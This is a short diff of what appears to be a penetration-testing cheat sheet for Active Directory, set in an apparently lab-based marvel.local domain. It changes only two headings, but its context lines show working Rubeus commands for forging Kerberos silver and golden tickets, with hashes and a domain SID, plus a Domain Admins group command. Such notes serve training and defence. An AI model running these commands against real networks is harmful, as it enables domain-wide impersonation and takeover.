@@ -18,13 +18,13 @@ net group "Domain Admins" user5 /domain /delete
 ```
 
 ### Silver Ticket (RC4, AES256)
-### Machine Account to impersonate any user on any service on that machine
+Machine Account to impersonate any user on any service on that machine
 ```powershell
 Rubeus.exe silver /service:cifs/machine.marvel.local /rc4:b2dfc9634eae3d4772050b979f3f3e2f /user:user3 /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /nowrap /ptt
 ```
 
 ### Golden Ticket (RC4, AES256)
-### KRBTGT Account to impersonate any user on any service on any machine
+KRBTGT Account to impersonate any user on any service on any machine
 ```powershell
 Rubeus.exe golden /rc4:249030b29d08621192b77cb5c8580fad /user:user3 /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /nowrap /ptt
 ```
